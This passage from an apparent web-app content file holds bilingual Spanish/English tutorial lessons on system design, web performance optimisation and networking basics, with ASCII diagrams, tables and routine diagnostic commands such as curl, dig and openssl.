│              ┌───┐                  │
│              │ DB│                  │
│              └───┘                  │
└─────────────────────────────────────┘
\`\`\`

**Advantages:**
- Simple to develop and deploy
- Easy to debug (everything in one place)
- Single database = consistency
- Ideal for small teams (<10 devs)

**Disadvantages:**
- Scale all or nothing
- One bug can bring everything down
- Risky deployments
- Hard to maintain as it grows

### Microservices: Divide and conquer

\`\`\`
┌─────────┐  ┌─────────┐  ┌─────────┐
│  Auth   │  │  Users  │  │ Orders  │
│ Service │  │ Service │  │ Service │
└────┬────┘  └────┬────┘  └────┬────┘
     │            │            │
┌────┴────┐  ┌────┴────┐  ┌────┴────┐
│Auth DB  │  │Users DB │  │Orders DB│
└─────────┘  └─────────┘  └─────────┘
\`\`\`

**Advantages:**
- Scale only what you need
- Independent teams
- One service fails, not all
- Different technologies per service

**Disadvantages:**
- High operational complexity
- Distributed debugging is hard
- Eventual consistency (not immediate)
- Requires mature DevOps

### When to use each

| Scenario | Recommendation |
|----------|----------------|
| Startup, MVP, < 5 devs | Monolith |
| Proven product, > 20 devs | Microservices |
| Parts with very different loads | Hybrid |
| Don't know which to choose | Monolith |

> **Golden rule:** Start with monolith. Extract microservices when the pain is real, not imagined.

---

## The CAP Theorem

In distributed systems, you can only have 2 of 3:

\`\`\`
        Consistency
           /\\
          /  \\
         /    \\
        /      \\
       /   ??   \\
      /          \\
     /____________\\
Availability    Partition
                Tolerance
\`\`\`

- **Consistency (C):** Everyone sees the same data at the same time
- **Availability (A):** The system always responds
- **Partition Tolerance (P):** Works even with network failures

### In practice

Network partitions CAN ALWAYS happen. So you really choose between:

| System | Chooses | Sacrifices | Example |
|--------|---------|------------|---------|
| **CP** | Consistency | Availability | Banks, inventory |
| **AP** | Availability | Consistency | Social networks, cache |

> **Real example:** In a bank, if there's a network failure, you prefer the ATM to say "Not available" (CP) rather than let you withdraw money you don't have (AP).

---

## Scaling: Vertical vs Horizontal

### Vertical: Bigger machine

\`\`\`
Before:         After:
┌─────┐         ┌─────────┐
│ 4GB │   →     │  64GB   │
│ 2CPU│         │  32CPU  │
└─────┘         └─────────┘
\`\`\`

- Simple: just upgrade the server
- Has physical limits
- Single point of failure

### Horizontal: More machines

\`\`\`
Before:         After:
┌─────┐         ┌─────┐ ┌─────┐ ┌─────┐
│ 4GB │   →     │ 4GB │ │ 4GB │ │ 4GB │
└─────┘         └─────┘ └─────┘ └─────┘
\`\`\`

- Theoretically infinite
- Requires Load Balancer
- Your app must be stateless

---

## Load Balancers

Distribute traffic among multiple servers.

\`\`\`
                    ┌─────────┐
                    │  Load   │
        Users   →   │Balancer │
                    └────┬────┘
                         │
           ┌─────────────┼─────────────┐
           ▼             ▼             ▼
      ┌─────────┐   ┌─────────┐   ┌─────────┐
      │Server 1 │   │Server 2 │   │Server 3 │
      └─────────┘   └─────────┘   └─────────┘
\`\`\`

### Distribution algorithms

| Algorithm | How it works | When to use |
|-----------|--------------|-------------|
| **Round Robin** | 1, 2, 3, 1, 2, 3... | Equal servers |
| **Least Connections** | To the one with fewer | Long connections |
| **IP Hash** | Same client → same server | Sticky sessions |
| **Weighted** | More to the powerful one | Different servers |

---

## Scaling Databases

### Replication: Read copies

\`\`\`
     Writes
        │
        ▼
   ┌─────────┐
   │ Primary │──────────────┐
   │  (RW)   │              │ Replication
   └─────────┘              │
        │                   │
        ▼                   ▼
   ┌─────────┐         ┌─────────┐
   │ Replica │         │ Replica │
   │  (RO)   │         │  (RO)   │
   └─────────┘         └─────────┘
        ▲                   ▲
        │                   │
      Reads              Reads
\`\`\`

- Scales reads, not writes
- Eventual consistency (replication lag)

### Sharding: Split the data

\`\`\`
user_id 1-1000      user_id 1001-2000    user_id 2001-3000
       │                   │                    │
       ▼                   ▼                    ▼
  ┌─────────┐         ┌─────────┐         ┌─────────┐
  │ Shard 1 │         │ Shard 2 │         │ Shard 3 │
  └─────────┘         └─────────┘         └─────────┘
\`\`\`

- Scales both reads and writes
- Complexity: JOINs between shards are expensive
- Choosing a good shard key is critical

---

## Caching: The key to performance

### Cache strategies

**Cache-Aside (Lazy Loading)**
\`\`\`
1. App requests data
2. Cache miss? → Read from DB → Store in cache
3. Cache hit? → Return from cache

┌─────┐  miss   ┌─────┐        ┌────┐
│ App │ ──────→ │Cache│        │ DB │
│     │ ←────── │     │        │    │
└─────┘  hit    └─────┘        └────┘
    │                              ▲
    └──────────────────────────────┘
         miss: read and store
\`\`\`

**Write-Through**
\`\`\`
Write to cache AND DB at the same time
- Data always consistent
- Slower writes
\`\`\`

**Write-Behind (Write-Back)**
\`\`\`
Write to cache, then async to DB
- Fast writes
- Risk of data loss if cache fails
\`\`\`

### What to cache

| Candidate | Priority |
|-----------|----------|
| Data that doesn't change (config) | High |
| Frequently read data | High |
| Expensive calculation results | High |
| Active user data | Medium |
| Data that changes every second | Low |

---

## Message Queues

For asynchronous communication between services.

\`\`\`
┌─────────┐     ┌─────────────┐     ┌─────────────┐
│Producer │ ──→ │    Queue    │ ──→ │  Consumer   │
│ (API)   │     │ (RabbitMQ)  │     │  (Worker)   │
└─────────┘     └─────────────┘     └─────────────┘
\`\`\`

### Use cases

- **Email sending:** API enqueues, worker sends
- **Image processing:** Upload enqueues, worker processes
- **Notifications:** Event enqueues, multiple consumers notify

### Popular tools

| Tool | Best for |
|------|----------|
| **RabbitMQ** | Traditional messaging, complex routing |
| **Redis Streams** | Simple, you already have Redis |
| **Kafka** | High volume, event sourcing |
| **SQS** | AWS native, simple |

---

## Practical case: Designing a URL Shortener

### Requirements

**Functional:**
- Shorten long URL → short code
- Redirect code → original URL
- URLs expire (optional)

**Non-functional:**
- 100M new URLs/month
- 10:1 read:write ratio
- Latency < 100ms

### Estimations

\`\`\`
URLs/month: 100M
URLs/sec: 100M / (30 * 24 * 3600) ≈ 40 URLs/sec writes
Reads: 40 * 10 = 400 URLs/sec reads

Storage (5 years):
100M * 12 * 5 = 6B URLs
6B * 500 bytes = 3TB
\`\`\`

### Short code design

Base62: [a-zA-Z0-9] = 62 characters

\`\`\`
7 characters = 62^7 = 3.5 trillion combinations
Enough for 100M/month for centuries
\`\`\`

### Final architecture

\`\`\`
                    ┌───────────┐
     Users     ───→ │    LB     │
                    └─────┬─────┘
                          │
              ┌───────────┴───────────┐
              ▼                       ▼
         ┌─────────┐             ┌─────────┐
         │ API 1   │             │ API 2   │
         └────┬────┘             └────┬────┘
              │                       │
              └───────────┬───────────┘
                          │
                    ┌─────┴─────┐
                    │   Redis   │ (Cache hot URLs)
                    └─────┬─────┘
                          │
                    ┌─────┴─────┐
                    │ Postgres  │ (Sharded by hash)
                    └───────────┘
\`\`\`

---

## Recommended resources

- **Book:** "Designing Data-Intensive Applications" - Martin Kleppmann
- **Book:** "System Design Interview" - Alex Xu
- **Web:** [system-design-primer](https://github.com/donnemartin/system-design-primer)
- **Practice:** [Exercism System Design](https://exercism.org/)

---

## Practice

-> [Architecture Workshop](/en/cooking/architecture-workshop) - Design a real system step by step
    `,
  },
  'performance': {
    contentEs: `
## Un restaurante lento pierde clientes

Imagina un restaurante con la mejor comida del mundo, pero donde cada platillo tarda 45 minutos. No importa que tan bueno sea, los clientes se van.

Las aplicaciones web son igual. Cada segundo de carga puede costar hasta 7% de conversiones.

> **Performance no es optimizacion prematura. Es respeto por el tiempo del usuario.**

---

## Core Web Vitals: Las metricas que importan

Google mide 3 metricas principales que afectan SEO y experiencia:

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                   CORE WEB VITALS                       │
├─────────────────┬─────────────────┬─────────────────────┤
│      LCP        │      INP        │       CLS           │
│   < 2.5s        │    < 200ms      │      < 0.1          │
│                 │                 │                     │
│  Largest        │  Interaction    │  Cumulative         │
│  Contentful     │  to Next        │  Layout             │
│  Paint          │  Paint          │  Shift              │
│                 │                 │                     │
│  "Carga rapida" │ "Responde bien" │ "Estable visualmente│
└─────────────────┴─────────────────┴─────────────────────┘
\`\`\`

| Metrica | Que mide | Bueno | Malo |
|---------|----------|-------|------|
| **LCP** | Cuanto tarda el contenido principal | < 2.5s | > 4s |
| **INP** | Respuesta a interacciones | < 200ms | > 500ms |
| **CLS** | Cuanto salta el layout | < 0.1 | > 0.25 |

---

## El pipeline del navegador

Entender como renderiza el navegador te ayuda a optimizar.

\`\`\`
HTML ──→ DOM
          │
CSS  ──→ CSSOM ──→ Render Tree ──→ Layout ──→ Paint ──→ Composite
\`\`\`

### Que bloquea el renderizado

- **JavaScript sincrono:** Bloquea parsing del HTML
- **CSS en el <head>:** Bloquea render (pero necesario)
- **Fonts externas:** Pueden causar FOIT/FOUT

---

## JavaScript: El cuello de botella

### El Event Loop

\`\`\`
┌─────────────────────────────────────────────────┐
│                  CALL STACK                      │
│    (Ejecuta codigo sincrono, uno a la vez)      │
└─────────────────────────────────────────────────┘
         ▲                         │
         │                         ▼
┌────────┴────────┐    ┌─────────────────────────┐
│   TASK QUEUE    │    │    MICROTASK QUEUE      │
│  (setTimeout,   │    │  (Promises, async/await)│
│   eventos)      │    │  (Mayor prioridad)      │
└─────────────────┘    └─────────────────────────┘
\`\`\`

### Problema: Bloqueo del main thread

\`\`\`javascript
// MAL: Bloquea el UI por 500ms
function processData(items) {
  items.forEach(item => heavyCalculation(item));
}

// BIEN: Divide en chunks
async function processDataAsync(items) {
  const chunkSize = 100;
  for (let i = 0; i < items.length; i += chunkSize) {
    const chunk = items.slice(i, i + chunkSize);
    chunk.forEach(item => heavyCalculation(item));
    await new Promise(r => setTimeout(r, 0)); // Yield al browser
  }
}
\`\`\`

---

## Optimizacion de bundles

### Code Splitting

\`\`\`javascript
// Sin splitting: todo carga al inicio
import { Dashboard } from './Dashboard';
import { Admin } from './Admin';
import { Reports } from './Reports';

// Con splitting: carga bajo demanda
const Dashboard = lazy(() => import('./Dashboard'));
const Admin = lazy(() => import('./Admin'));
const Reports = lazy(() => import('./Reports'));
\`\`\`

### Tree Shaking

\`\`\`javascript
// MAL: Importa toda la libreria (100KB)
import _ from 'lodash';
_.debounce(fn, 300);

// BIEN: Solo lo que necesitas (2KB)
import debounce from 'lodash/debounce';
debounce(fn, 300);
\`\`\`

---

## Optimizacion de imagenes

### Formatos modernos

| Formato | Uso | Ahorro vs JPEG |
|---------|-----|----------------|
| **WebP** | General, soporte amplio | 25-35% |
| **AVIF** | Mejor compresion, menos soporte | 50%+ |

### Responsive images

\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    alt="Hero"
    loading="lazy"
    width="1200"
    height="600"
  >
</picture>
\`\`\`

### Next.js Image

\`\`\`jsx
import Image from 'next/image';

<Image
  src="/hero.jpg"
  alt="Hero"
  width={1200}
  height={600}
  priority // Para imagenes above the fold
  placeholder="blur" // Efecto de carga
/>
\`\`\`

---

## Caching estrategico

### Niveles de cache

\`\`\`
Usuario ──→ Browser Cache ──→ CDN Cache ──→ Server ──→ DB
           (localStorage,     (Edge)        (Redis)
            sessionStorage)
\`\`\`

### HTTP Cache Headers

\`\`\`
Cache-Control: public, max-age=31536000, immutable
                │       │                 │
                │       │                 └─ No revalidar
                │       └─ 1 año en segundos
                └─ CDN puede cachear
\`\`\`

### Estrategia por tipo de recurso

| Recurso | Cache-Control | Porque |
|---------|---------------|--------|
| JS/CSS con hash | max-age=31536000, immutable | Hash cambia si archivo cambia |
| HTML | no-cache | Siempre validar con server |
| API dinamica | private, max-age=0 | Datos frescos |
| Imagenes estaticas | max-age=86400 | 1 dia, CDN |

---

## Database performance

### Indices: La clave

\`\`\`sql
-- Sin indice: Full table scan (lento)
SELECT * FROM users WHERE email = 'test@example.com';
-- Tiempo: 500ms en 1M rows

-- Con indice: Index lookup (rapido)
CREATE INDEX idx_users_email ON users(email);
-- Tiempo: 2ms
\`\`\`

### EXPLAIN: Entiende tus queries

\`\`\`sql
EXPLAIN ANALYZE SELECT * FROM orders
WHERE user_id = 123 AND created_at > '2024-01-01';

-- Busca:
-- - Seq Scan (malo en tablas grandes)
-- - Index Scan (bueno)
-- - Rows estimados vs reales
\`\`\`

### El problema N+1

\`\`\`javascript
// MAL: N+1 queries
const users = await User.findAll();
for (const user of users) {
  user.orders = await Order.findByUser(user.id); // 1 query por user
}
// 1 + N queries

// BIEN: Eager loading
const users = await User.findAll({
  include: [{ model: Order }]
});
// 1 query con JOIN
\`\`\`

---

## Herramientas de profiling

### Chrome DevTools

1. **Performance tab:** Graba timeline de carga
2. **Network tab:** Waterfall de requests
3. **Lighthouse:** Auditoria completa

### Que buscar en Performance tab

\`\`\`
Timeline:
├── Loading (azul): Parsing HTML
├── Scripting (amarillo): JavaScript
├── Rendering (morado): Layout, style
└── Painting (verde): Dibujando pixeles

Si amarillo domina → Optimiza JS
Si morado domina → Reduce reflows
\`\`\`

---

## Checklist de performance

### Antes del deploy

- [ ] Lighthouse score > 90
- [ ] LCP < 2.5s
- [ ] Bundle size < 200KB (inicial)
- [ ] Imagenes en WebP/AVIF
- [ ] Lazy loading en imagenes below fold
- [ ] Code splitting activo
- [ ] Cache headers configurados

### En produccion

- [ ] CDN configurado
- [ ] Gzip/Brotli activo
- [ ] HTTP/2 habilitado
- [ ] Indices en queries lentas
- [ ] Monitoring de Core Web Vitals

---

## Recursos

- [web.dev/performance](https://web.dev/performance/)
- [Chrome DevTools Docs](https://developer.chrome.com/docs/devtools/)
- [PageSpeed Insights](https://pagespeed.web.dev/)

---

## Practica

-> [Auditoria de Performance](/es/cooking/performance-audit) - Optimiza una app lenta paso a paso
    `,
    contentEn: `
## A slow restaurant loses customers

Imagine a restaurant with the best food in the world, but where every dish takes 45 minutes. No matter how good it is, customers leave.

Web applications are the same. Every second of load time can cost up to 7% in conversions.

> **Performance isn't premature optimization. It's respect for the user's time.**

---

## Core Web Vitals: The metrics that matter

Google measures 3 main metrics that affect SEO and experience:

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                   CORE WEB VITALS                       │
├─────────────────┬─────────────────┬─────────────────────┤
│      LCP        │      INP        │       CLS           │
│   < 2.5s        │    < 200ms      │      < 0.1          │
│                 │                 │                     │
│  Largest        │  Interaction    │  Cumulative         │
│  Contentful     │  to Next        │  Layout             │
│  Paint          │  Paint          │  Shift              │
│                 │                 │                     │
│  "Fast load"    │ "Responsive"    │ "Visually stable"   │
└─────────────────┴─────────────────┴─────────────────────┘
\`\`\`

| Metric | What it measures | Good | Bad |
|--------|------------------|------|-----|
| **LCP** | How long main content takes | < 2.5s | > 4s |
| **INP** | Response to interactions | < 200ms | > 500ms |
| **CLS** | How much layout shifts | < 0.1 | > 0.25 |

---

## The browser pipeline

Understanding how the browser renders helps you optimize.

\`\`\`
HTML ──→ DOM
          │
CSS  ──→ CSSOM ──→ Render Tree ──→ Layout ──→ Paint ──→ Composite
\`\`\`

### What blocks rendering

- **Synchronous JavaScript:** Blocks HTML parsing
- **CSS in <head>:** Blocks render (but necessary)
- **External fonts:** Can cause FOIT/FOUT

---

## JavaScript: The bottleneck

### The Event Loop

\`\`\`
┌─────────────────────────────────────────────────┐
│                  CALL STACK                      │
│    (Executes synchronous code, one at a time)   │
└─────────────────────────────────────────────────┘
         ▲                         │
         │                         ▼
┌────────┴────────┐    ┌─────────────────────────┐
│   TASK QUEUE    │    │    MICROTASK QUEUE      │
│  (setTimeout,   │    │  (Promises, async/await)│
│   events)       │    │  (Higher priority)      │
└─────────────────┘    └─────────────────────────┘
\`\`\`

### Problem: Main thread blocking

\`\`\`javascript
// BAD: Blocks UI for 500ms
function processData(items) {
  items.forEach(item => heavyCalculation(item));
}

// GOOD: Divide into chunks
async function processDataAsync(items) {
  const chunkSize = 100;
  for (let i = 0; i < items.length; i += chunkSize) {
    const chunk = items.slice(i, i + chunkSize);
    chunk.forEach(item => heavyCalculation(item));
    await new Promise(r => setTimeout(r, 0)); // Yield to browser
  }
}
\`\`\`

---

## Bundle optimization

### Code Splitting

\`\`\`javascript
// Without splitting: everything loads at start
import { Dashboard } from './Dashboard';
import { Admin } from './Admin';
import { Reports } from './Reports';

// With splitting: loads on demand
const Dashboard = lazy(() => import('./Dashboard'));
const Admin = lazy(() => import('./Admin'));
const Reports = lazy(() => import('./Reports'));
\`\`\`

### Tree Shaking

\`\`\`javascript
// BAD: Imports entire library (100KB)
import _ from 'lodash';
_.debounce(fn, 300);

// GOOD: Only what you need (2KB)
import debounce from 'lodash/debounce';
debounce(fn, 300);
\`\`\`

---

## Image optimization

### Modern formats

| Format | Use | Savings vs JPEG |
|--------|-----|-----------------|
| **WebP** | General, wide support | 25-35% |
| **AVIF** | Best compression, less support | 50%+ |

### Responsive images

\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    alt="Hero"
    loading="lazy"
    width="1200"
    height="600"
  >
</picture>
\`\`\`

### Next.js Image

\`\`\`jsx
import Image from 'next/image';

<Image
  src="/hero.jpg"
  alt="Hero"
  width={1200}
  height={600}
  priority // For above the fold images
  placeholder="blur" // Loading effect
/>
\`\`\`

---

## Strategic caching

### Cache levels

\`\`\`
User ──→ Browser Cache ──→ CDN Cache ──→ Server ──→ DB
         (localStorage,     (Edge)        (Redis)
          sessionStorage)
\`\`\`

### HTTP Cache Headers

\`\`\`
Cache-Control: public, max-age=31536000, immutable
                │       │                 │
                │       │                 └─ Don't revalidate
                │       └─ 1 year in seconds
                └─ CDN can cache
\`\`\`

### Strategy by resource type

| Resource | Cache-Control | Why |
|----------|---------------|-----|
| JS/CSS with hash | max-age=31536000, immutable | Hash changes if file changes |
| HTML | no-cache | Always validate with server |
| Dynamic API | private, max-age=0 | Fresh data |
| Static images | max-age=86400 | 1 day, CDN |

---

## Database performance

### Indexes: The key

\`\`\`sql
-- Without index: Full table scan (slow)
SELECT * FROM users WHERE email = 'test@example.com';
-- Time: 500ms on 1M rows

-- With index: Index lookup (fast)
CREATE INDEX idx_users_email ON users(email);
-- Time: 2ms
\`\`\`

### EXPLAIN: Understand your queries

\`\`\`sql
EXPLAIN ANALYZE SELECT * FROM orders
WHERE user_id = 123 AND created_at > '2024-01-01';

-- Look for:
-- - Seq Scan (bad on large tables)
-- - Index Scan (good)
-- - Estimated vs actual rows
\`\`\`

### The N+1 problem

\`\`\`javascript
// BAD: N+1 queries
const users = await User.findAll();
for (const user of users) {
  user.orders = await Order.findByUser(user.id); // 1 query per user
}
// 1 + N queries

// GOOD: Eager loading
const users = await User.findAll({
  include: [{ model: Order }]
});
// 1 query with JOIN
\`\`\`

---

## Profiling tools

### Chrome DevTools

1. **Performance tab:** Record load timeline
2. **Network tab:** Request waterfall
3. **Lighthouse:** Complete audit

### What to look for in Performance tab

\`\`\`
Timeline:
├── Loading (blue): Parsing HTML
├── Scripting (yellow): JavaScript
├── Rendering (purple): Layout, style
└── Painting (green): Drawing pixels

If yellow dominates → Optimize JS
If purple dominates → Reduce reflows
\`\`\`

---

## Performance checklist

### Before deploy

- [ ] Lighthouse score > 90
- [ ] LCP < 2.5s
- [ ] Bundle size < 200KB (initial)
- [ ] Images in WebP/AVIF
- [ ] Lazy loading on below fold images
- [ ] Code splitting active
- [ ] Cache headers configured

### In production

- [ ] CDN configured
- [ ] Gzip/Brotli active
- [ ] HTTP/2 enabled
- [ ] Indexes on slow queries
- [ ] Core Web Vitals monitoring

---

## Resources

- [web.dev/performance](https://web.dev/performance/)
- [Chrome DevTools Docs](https://developer.chrome.com/docs/devtools/)
- [PageSpeed Insights](https://pagespeed.web.dev/)

---

## Practice

-> [Performance Audit](/en/cooking/performance-audit) - Optimize a slow app step by step
    `,
  },
  'networking': {
    contentEs: `
## Como viaja un mensaje por internet

Imagina enviar una carta. No la tiras al aire esperando que llegue. La pones en un sobre con direccion, la llevas al correo, pasa por centros de distribucion, y finalmente llega.

Internet funciona igual, pero en milisegundos.

---

## El modelo OSI simplificado

7 capas es mucho. Piensa en 4:

\`\`\`
┌─────────────────────────────────────┐
│  APLICACION  (HTTP, DNS, SMTP)      │ ← Tu codigo vive aqui
├─────────────────────────────────────┤
│  TRANSPORTE  (TCP, UDP)             │ ← Entrega confiable o rapida
├─────────────────────────────────────┤
│  RED         (IP, ICMP)             │ ← Direcciones y rutas
├─────────────────────────────────────┤
│  ENLACE      (Ethernet, WiFi)       │ ← Cables y ondas
└─────────────────────────────────────┘
\`\`\`

---

## TCP vs UDP

### TCP: El cartero confiable

\`\`\`
Cliente                           Servidor
   │                                 │
   │──── SYN ─────────────────────→│
   │←─── SYN-ACK ──────────────────│
   │──── ACK ─────────────────────→│
   │                                 │
   │  (Conexion establecida)         │
   │                                 │
   │──── Datos ───────────────────→│
   │←─── ACK ──────────────────────│
\`\`\`

- **Garantiza entrega:** Reintenta si se pierde
- **Ordenado:** Llega en orden correcto
- **Mas lento:** Por el handshake y confirmaciones

**Usa TCP para:** HTTP, Email, archivos, cualquier cosa que no puede perder datos.

### UDP: El mensajero rapido

\`\`\`
Cliente                           Servidor
   │                                 │
   │──── Datos ───────────────────→│
   │──── Datos ───────────────────→│
   │──── Datos ───────────────────→│
   │                                 │
   │  (Sin confirmacion)             │
\`\`\`

- **No garantiza:** Puede perder paquetes
- **Sin orden:** Llegan como pueden
- **Rapido:** Sin overhead de conexion

**Usa UDP para:** Video streaming, juegos, DNS, VoIP.

---

## HTTP a fondo

### Metodos y su semantica

| Metodo | Uso | Idempotente | Body |
|--------|-----|-------------|------|
| **GET** | Obtener datos | Si | No |
| **POST** | Crear recurso | No | Si |
| **PUT** | Reemplazar completo | Si | Si |
| **PATCH** | Modificar parcial | No | Si |
| **DELETE** | Eliminar | Si | No |

### Status codes que debes conocer

\`\`\`
2xx Exito
├── 200 OK - Todo bien
├── 201 Created - Recurso creado
└── 204 No Content - Exito sin body

3xx Redireccion
├── 301 Moved Permanently - URL cambio para siempre
├── 302 Found - Redireccion temporal
└── 304 Not Modified - Usa tu cache

4xx Error del cliente
├── 400 Bad Request - Request mal formada
├── 401 Unauthorized - Necesita autenticacion
├── 403 Forbidden - Autenticado pero sin permiso
├── 404 Not Found - Recurso no existe
└── 429 Too Many Requests - Rate limited

5xx Error del servidor
├── 500 Internal Server Error - Bug en el server
├── 502 Bad Gateway - Proxy no pudo conectar
├── 503 Service Unavailable - Server sobrecargado
└── 504 Gateway Timeout - Proxy timeout
\`\`\`

---

## HTTPS y TLS

### El handshake TLS

\`\`\`
Cliente                           Servidor
   │                                 │
   │──── ClientHello ─────────────→│ (versiones TLS, ciphers)
   │←─── ServerHello ──────────────│ (certificado, cipher elegido)
   │                                 │
   │     (Verifica certificado)      │
   │                                 │
   │──── Key Exchange ────────────→│ (genera clave de sesion)
   │←─── Finished ─────────────────│
   │                                 │
   │  === Conexion encriptada ===    │
\`\`\`

### Verificar un certificado

\`\`\`bash
# Ver certificado de un sitio
openssl s_client -connect google.com:443 -servername google.com 2>/dev/null | openssl x509 -text -noout

# Ver fechas de expiracion
echo | openssl s_client -connect luxia.us:443 2>/dev/null | openssl x509 -dates -noout
\`\`\`

---

## DNS: El directorio telefonico

\`\`\`
Tu navegador pide: luxia.us

1. Cache local (tu maquina)
2. Router cache
3. ISP DNS resolver
4. Root DNS (.us)
5. TLD DNS (luxia.us)
6. Authoritative DNS → IP: 123.45.67.89
\`\`\`

### Comandos utiles

\`\`\`bash
# Resolver dominio
nslookup luxia.us

# Mas detalle
dig luxia.us

# Ver todos los registros
dig luxia.us ANY

# Trazar la resolucion
dig +trace luxia.us
\`\`\`

---

## WebSockets: Comunicacion bidireccional

HTTP es request-response. WebSocket es un canal abierto.

\`\`\`
HTTP tradicional:
Cliente ──request──→ Servidor
Cliente ←─response─ Servidor
Cliente ──request──→ Servidor
Cliente ←─response─ Servidor

WebSocket:
Cliente ←──────────→ Servidor
         Canal abierto, ambos
         pueden enviar cuando quieran
\`\`\`

### Cuando usar WebSocket

- Chat en tiempo real
- Notificaciones push
- Juegos multiplayer
- Colaboracion en vivo (Google Docs)
- Actualizaciones de precio (trading)

---

## CORS: Por que existe

Los navegadores bloquean requests de un origen a otro por seguridad.

\`\`\`
https://mi-app.com       https://api.otro.com
       │                         │
       │──── fetch() ──────────→│
       │                         │
       │  BLOQUEADO por CORS     │
       │  (a menos que api.otro  │
       │   lo permita)           │
\`\`\`

### Headers CORS

\`\`\`javascript
// En tu servidor Express
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://mi-app.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
\`\`\`

---

## Herramientas de debugging

### curl: Navaja suiza de HTTP

\`\`\`bash
# GET basico
curl https://api.example.com/users

# Con headers
curl -H "Authorization: Bearer TOKEN" https://api.example.com/me

# POST con JSON
curl -X POST -H "Content-Type: application/json" \\
  -d '{"name":"John"}' https://api.example.com/users

# Ver headers de respuesta
curl -I https://example.com

# Ver todo el intercambio
curl -v https://example.com

# Medir tiempos
curl -w "@curl-format.txt" -o /dev/null -s https://example.com
\`\`\`

### ping y traceroute

\`\`\`bash
# Verificar conectividad
ping google.com

# Ver ruta de paquetes
traceroute google.com  # Linux/Mac
tracert google.com     # Windows
\`\`\`

### netstat/ss: Conexiones activas

\`\`\`bash
# Ver puertos escuchando
ss -tlnp   # Linux
netstat -an | grep LISTEN  # Mac

# Ver conexiones establecidas
ss -tn
\`\`\`

---

## Puertos comunes

| Puerto | Servicio | Notas |
|--------|----------|-------|
| 22 | SSH | Acceso remoto seguro |
| 80 | HTTP | Web sin encriptar |
| 443 | HTTPS | Web encriptada |
| 3000 | Dev servers | Node, Rails, etc. |
| 5432 | PostgreSQL | Base de datos |
| 6379 | Redis | Cache |
| 27017 | MongoDB | Base de datos |

---

## CDN: Contenido cerca del usuario

\`\`\`
Sin CDN:
Usuario (Mexico) ──────────────→ Servidor (USA)
                   200ms

Con CDN:
Usuario (Mexico) ──→ Edge (Mexico)
                   20ms

El contenido estatico se replica en edges
alrededor del mundo.
\`\`\`

---

## Recursos

- [MDN HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [High Performance Browser Networking](https://hpbn.co/)
- [Cloudflare Learning Center](https://www.cloudflare.com/learning/)

---

## Practica

-> [Network Debugging](/es/cooking/network-debugging) - Diagnostica problemas de red reales
    `,
    contentEn: `
## How a message travels through the internet

Imagine sending a letter. You don't throw it in the air hoping it arrives. You put it in an envelope with an address, take it to the post office, it goes through distribution centers, and finally arrives.

The internet works the same, but in milliseconds.

---

## The simplified OSI model

7 layers is too much. Think of 4:

\`\`\`
┌─────────────────────────────────────┐
│  APPLICATION (HTTP, DNS, SMTP)      │ ← Your code lives here
├─────────────────────────────────────┤
│  TRANSPORT   (TCP, UDP)             │ ← Reliable or fast delivery
├─────────────────────────────────────┤
│  NETWORK     (IP, ICMP)             │ ← Addresses and routes
├─────────────────────────────────────┤
│  LINK        (Ethernet, WiFi)       │ ← Cables and waves
└─────────────────────────────────────┘
\`\`\`

---

## TCP vs UDP

### TCP: The reliable postman

\`\`\`
Client                              Server
   │                                 │
   │──── SYN ─────────────────────→│
   │←─── SYN-ACK ──────────────────│
   │──── ACK ─────────────────────→│
   │                                 │
   │  (Connection established)       │
   │                                 │
   │──── Data ────────────────────→│
   │←─── ACK ──────────────────────│
\`\`\`

- **Guarantees delivery:** Retries if lost
- **Ordered:** Arrives in correct order
- **Slower:** Due to handshake and confirmations

**Use TCP for:** HTTP, Email, files, anything that can't lose data.

### UDP: The fast messenger

\`\`\`
Client                              Server
   │                                 │
   │──── Data ────────────────────→│
   │──── Data ────────────────────→│
   │──── Data ────────────────────→│
   │                                 │
   │  (No confirmation)              │
\`\`\`

- **No guarantees:** Can lose packets
- **Unordered:** Arrive as they can
- **Fast:** No connection overhead

**Use UDP for:** Video streaming, games, DNS, VoIP.

---

## HTTP deep dive

### Methods and their semantics

| Method | Use | Idempotent | Body |
|--------|-----|------------|------|
| **GET** | Get data | Yes | No |
| **POST** | Create resource | No | Yes |
| **PUT** | Replace complete | Yes | Yes |
| **PATCH** | Modify partial | No | Yes |
| **DELETE** | Delete | Yes | No |

### Status codes you should know

\`\`\`
2xx Success
├── 200 OK - All good
├── 201 Created - Resource created
└── 204 No Content - Success without body

3xx Redirection
├── 301 Moved Permanently - URL changed forever
├── 302 Found - Temporary redirect
└── 304 Not Modified - Use your cache

4xx Client Error
├── 400 Bad Request - Malformed request
├── 401 Unauthorized - Needs authentication
├── 403 Forbidden - Authenticated but no permission
├── 404 Not Found - Resource doesn't exist
└── 429 Too Many Requests - Rate limited

5xx Server Error
├── 500 Internal Server Error - Bug in server
├── 502 Bad Gateway - Proxy couldn't connect
├── 503 Service Unavailable - Server overloaded
└── 504 Gateway Timeout - Proxy timeout
\`\`\`

---

## HTTPS and TLS

### The TLS handshake

\`\`\`
Client                              Server
   │                                 │
   │──── ClientHello ─────────────→│ (TLS versions, ciphers)
   │←─── ServerHello ──────────────│ (certificate, chosen cipher)
   │                                 │
   │     (Verify certificate)        │
   │                                 │
   │──── Key Exchange ────────────→│ (generate session key)
   │←─── Finished ─────────────────│
   │                                 │
   │  === Encrypted connection ===   │
\`\`\`

### Verify a certificate

\`\`\`bash
# See site certificate
openssl s_client -connect google.com:443 -servername google.com 2>/dev/null | openssl x509 -text -noout

# See expiration dates
echo | openssl s_client -connect luxia.us:443 2>/dev/null | openssl x509 -dates -noout
\`\`\`

---

## DNS: The phone book

\`\`\`
Your browser asks for: luxia.us

1. Local cache (your machine)
2. Router cache
3. ISP DNS resolver
4. Root DNS (.us)
5. TLD DNS (luxia.us)
6. Authoritative DNS → IP: 123.45.67.89
\`\`\`

### Useful commands

\`\`\`bash
# Resolve domain
nslookup luxia.us

# More detail
dig luxia.us

# See all records
dig luxia.us ANY

# Trace resolution
